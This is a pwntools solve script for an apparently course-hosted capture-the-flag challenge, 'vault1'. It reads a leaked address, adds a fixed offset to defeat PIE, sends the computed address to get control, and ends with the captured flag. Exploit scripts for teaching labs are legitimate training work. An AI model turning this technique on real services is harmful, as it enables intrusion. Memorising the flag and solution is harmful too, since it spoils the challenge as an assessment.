from pwn import *
import re

# context.log_level = "DEBUG"

CHALLENGE = "vault1"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1231
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

data = p.recvuntil(b"> ").decode()
print(data)
pattern = re.compile(r"0x[0-9a-fA-F]+")
base_addr = int(pattern.findall(data).pop(), 16)
offset = 0x1249
addr = base_addr + offset
p.sendline(hex(addr).encode())
log.info(f"Sending address in base 16: {hex(addr)}")

p.interactive()

# flag{n0t_s00_PIE_1f_w3_g3t_th3_BASE!_a304d898a1771efb}
